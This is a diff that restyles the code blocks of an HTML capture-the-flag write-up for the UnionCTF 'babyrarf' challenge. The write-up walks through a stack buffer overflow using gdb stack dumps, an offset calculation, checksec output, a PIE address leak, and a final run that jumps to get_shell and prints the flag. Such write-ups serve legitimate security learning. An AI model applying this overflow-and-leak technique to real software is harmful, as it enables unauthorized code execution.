@@ -547,8 +547,7 @@ Let&rsquo;s take a look at the src!
 >.
 It was a really easy challenge with a stack based buffer overflow. The source code was provided so, no need to reverse the binary :).</p>
 <p>Let&rsquo;s take a look at the src!</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">
-<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
 </span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
 </span><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
 </span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
@@ -656,69 +655,68 @@ It was a really easy challenge with a stack based buffer overflow. The source co
 
 </code></pre></div><p>It&rsquo;s basically some kind of game, we have to win a lot of times to display <code>Congratulations! You may now declare yourself the winner</code>. And when we reach this part we can trigger a buffer overflow with a call to fgets (<code>fgets(player.name, 48, stdin);</code>). We notice too the get_shell function (maybe we will have to jump on ?).</p>
 <p>Let&rsquo;s take a look at gdb:</p>
-<pre tabindex="0"><code>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
-0x00007fffffffdf48│+0x0000: 0x00007ffff7dd30b3  →  &lt;__libc_start_main+243&gt; mov edi, eax	 ← $rsp
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffdf48│+0x0000: 0x00007ffff7dd30b3  →  &lt;__libc_start_main+243&gt; mov edi, eax	 ← <span class="nv">$rsp</span>
 0x00007fffffffdf50│+0x0008: 0x00007ffff7ffc620  →  0x0005081200000000
-0x00007fffffffdf58│+0x0010: 0x00007fffffffe038  →  0x00007fffffffe357  →  &quot;/home/nasm/dist/babyrarf&quot;
+0x00007fffffffdf58│+0x0010: 0x00007fffffffe038  →  0x00007fffffffe357  →  <span class="s2">&#34;/home/nasm/dist/babyrarf&#34;</span>
 0x00007fffffffdf60│+0x0018: 0x0000000100000000
 0x00007fffffffdf68│+0x0020: 0x00005555555552e4  →  &lt;main+0&gt; push rbp
 0x00007fffffffdf70│+0x0028: 0x00005555555554d0  →  &lt;__libc_csu_init+0&gt; endbr64 
 0x00007fffffffdf78│+0x0030: 0xdb21ca7fd193f05a
 0x00007fffffffdf80│+0x0038: 0x00005555555550b0  →  &lt;_start+0&gt; endbr64 
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
-   0x5555555552de &lt;choose_attack+234&gt; mov    rdx, QWORD PTR [rbp-0x18]
+   0x5555555552de &lt;choose_attack+234&gt; mov    rdx, QWORD PTR <span class="o">[</span>rbp-0x18<span class="o">]</span>
    0x5555555552e2 &lt;choose_attack+238&gt; leave  
    0x5555555552e3 &lt;choose_attack+239&gt; ret    
  → 0x5555555552e4 &lt;main+0&gt;         push   rbp
    0x5555555552e5 &lt;main+1&gt;         mov    rbp, rsp
    0x5555555552e8 &lt;main+4&gt;         sub    rsp, 0x40
-   0x5555555552ec &lt;main+8&gt;         mov    QWORD PTR [rbp-0x20], 0x0
-   0x5555555552f4 &lt;main+16&gt;        mov    QWORD PTR [rbp-0x18], 0x0
-   0x5555555552fc &lt;main+24&gt;        mov    DWORD PTR [rbp-0x14], 0x64
+   0x5555555552ec &lt;main+8&gt;         mov    QWORD PTR <span class="o">[</span>rbp-0x20<span class="o">]</span>, 0x0
+   0x5555555552f4 &lt;main+16&gt;        mov    QWORD PTR <span class="o">[</span>rbp-0x18<span class="o">]</span>, 0x0
+   0x5555555552fc &lt;main+24&gt;        mov    DWORD PTR <span class="o">[</span>rbp-0x14<span class="o">]</span>, 0x64
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
-[#0] Id 1, Name: &quot;babyrarf&quot;, stopped 0x5555555552e4 in main (), reason: BREAKPOINT
+<span class="o">[</span><span class="c1">#0] Id 1, Name: &#34;babyrarf&#34;, stopped 0x5555555552e4 in main (), reason: BREAKPOINT</span>
 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
-[#0] 0x5555555552e4 → main()
+<span class="o">[</span><span class="c1">#0] 0x5555555552e4 → main()</span>
 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 gef➤  
-</code></pre><p>And at the call to fgets:</p>
-<pre tabindex="0"><code>   0x55555555537d &lt;main+153&gt;       lea    rax, [rbp-0x20]
+</code></pre></div><p>And at the call to fgets:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">   0x55555555537d &lt;main+153&gt;       lea    rax, <span class="o">[</span>rbp-0x20<span class="o">]</span>
    0x555555555381 &lt;main+157&gt;       mov    esi, 0xa
    0x555555555386 &lt;main+162&gt;       mov    rdi, rax
  → 0x555555555389 &lt;main+165&gt;       call   0x555555555060 &lt;fgets@plt&gt;
-   ↳  0x555555555060 &lt;fgets@plt+0&gt;    jmp    QWORD PTR [rip+0x2fca]        # 0x555555558030 &lt;fgets@got.plt&gt;
+   ↳  0x555555555060 &lt;fgets@plt+0&gt;    jmp    QWORD PTR <span class="o">[</span>rip+0x2fca<span class="o">]</span>        <span class="c1"># 0x555555558030 &lt;fgets@got.plt&gt;</span>
       0x555555555066 &lt;fgets@plt+6&gt;    push   0x3
       0x55555555506b &lt;fgets@plt+11&gt;   jmp    0x555555555020
-      0x555555555070 &lt;execve@plt+0&gt;   jmp    QWORD PTR [rip+0x2fc2]        # 0x555555558038 &lt;execve@got.plt&gt;
+      0x555555555070 &lt;execve@plt+0&gt;   jmp    QWORD PTR <span class="o">[</span>rip+0x2fc2<span class="o">]</span>        <span class="c1"># 0x555555558038 &lt;execve@got.plt&gt;</span>
       0x555555555076 &lt;execve@plt+6&gt;   push   0x4
       0x55555555507b &lt;execve@plt+11&gt;  jmp    0x555555555020
-────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
-fgets@plt (
-   $rdi = 0x00007fffffffdf20 → 0x0000000000000000,
-   $rsi = 0x000000000000000a,
-   $rdx = 0x00007ffff7f97980 → 0x00000000fbad208b
-)
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments <span class="o">(</span>guessed<span class="o">)</span> ────
+fgets@plt <span class="o">(</span>
+   <span class="nv">$rdi</span> <span class="o">=</span> 0x00007fffffffdf20 → 0x0000000000000000,
+   <span class="nv">$rsi</span> <span class="o">=</span> 0x000000000000000a,
+   <span class="nv">$rdx</span> <span class="o">=</span> 0x00007ffff7f97980 → 0x00000000fbad208b
+<span class="o">)</span>
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
-[#0] Id 1, Name: &quot;babyrarf&quot;, stopped 0x555555555389 in main (), reason: SINGLE STEP
+<span class="o">[</span><span class="c1">#0] Id 1, Name: &#34;babyrarf&#34;, stopped 0x555555555389 in main (), reason: SINGLE STEP</span>
 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
-[#0] 0x555555555389 → main()
+<span class="o">[</span><span class="c1">#0] 0x555555555389 → main()</span>
 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 gef➤  
-</code></pre><p>So main_ret_addr minus player.name is equal to: <code>0x00007fffffffdf48 - 0x00007fffffffdf20 = 40 </code>.
+</code></pre></div><p>So main_ret_addr minus player.name is equal to: <code>0x00007fffffffdf48 - 0x00007fffffffdf20 = 40 </code>.
 So we have basically a padding of 40 bytes before the return address, and according to the last fgets, we can only enter 48 bytes.
 We can so overwrite only the return address.</p>
 <p>Now we can take a look at the permissions:</p>
-<pre tabindex="0"><code>gef➤  checksec
-[+] checksec for '/home/nasm/dist/babyrarf'
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">gef➤  checksec
+<span class="o">[</span>+<span class="o">]</span> checksec <span class="k">for</span> <span class="s1">&#39;/home/nasm/dist/babyrarf&#39;</span>
 Canary                        : ✘ 
 NX                            : ✓ 
 PIE                           : ✓ 
 Fortify                       : ✘ 
 RelRO                         : Partial
-</code></pre><p>We can see, the binary is PIE based, so in order to jump on get_shell we need to leak some binary&rsquo;s functions.
+</code></pre></div><p>We can see, the binary is PIE based, so in order to jump on get_shell we need to leak some binary&rsquo;s functions.
 To do so we can mind the code of <code>choose_attack</code> function:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">
-<span class="n">attack</span> <span class="nf">choose_attack</span><span class="p">(){</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">attack</span> <span class="nf">choose_attack</span><span class="p">(){</span>
     <span class="n">attack</span> <span class="n">a</span><span class="p">;</span>
     <span class="kt">int</span> <span class="n">id</span><span class="p">;</span>
     <span class="cm">/* Some print stuff */</span>
@@ -807,13 +805,12 @@ So we just need to leak the address of <code>__lib_csu_init</code> to compute th
 </code></pre></div><p>We can compute compute the value of rand to avoid bruteforce, but I&rsquo;ve choosen to do not. So while it does not print <code>l0zers don't get cr0wns</code>, I&rsquo;m sending 4 for cr0wn and when it is teh case I get my leak of the csu and I compute the base address.
 When It&rsquo;s done I&rsquo;m sending 1 because it sounds more speed and I wait to win.
 And when I won I can trigger the buffer overflow and jmp on <code>get_shell</code>.</p>
-<pre tabindex="0"><code>
-/* ... */
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">/* ... */
 /* lot of iterations */
 /* ... */
 
-You deal 40 dmg
-The boss deals 70 dmg
+You deal <span class="m">40</span> dmg
+The boss deals <span class="m">70</span> dmg
 You lost!
 
 Choose an attack:
@@ -822,24 +819,24 @@ Choose an attack:
 
 2. A bigger knife
 
-3. Her Majesty's knife
+3. Her Majesty<span class="err">&#39;</span>s knife
 
 4. A cr0wn
 
 
-leak_csu=0x55b3b5b3a4d0
+<span class="nv">leak_csu</span><span class="o">=</span>0x55b3b5b3a4d0
 base: 0x55b3b5b39000
-You deal 140736258161760 dmg
-The boss deals 96 dmg
+You deal <span class="m">140736258161760</span> dmg
+The boss deals <span class="m">96</span> dmg
 You lost!
 
-Congratulations! You may now declare yourself the winner:
+Congratulations! You may now <span class="nb">declare</span> yourself the winner:
 
 
-[*] Switching to interactive mode
+<span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
 $ cat /home/babyrarf/flag.txt
-union{baby_rarf_d0o_d00_do0_doo_do0_d0o}
-</code></pre><p>The final script can be found <a
+union<span class="o">{</span>baby_rarf_d0o_d00_do0_doo_do0_d0o<span class="o">}</span>
+</code></pre></div><p>The final script can be found <a
   class="gblog-markdown__link"
   href="https://github.com/ret2school/ctf/blob/master/2021/unionctf/pwn/babyrarf/p0wn.py"
   
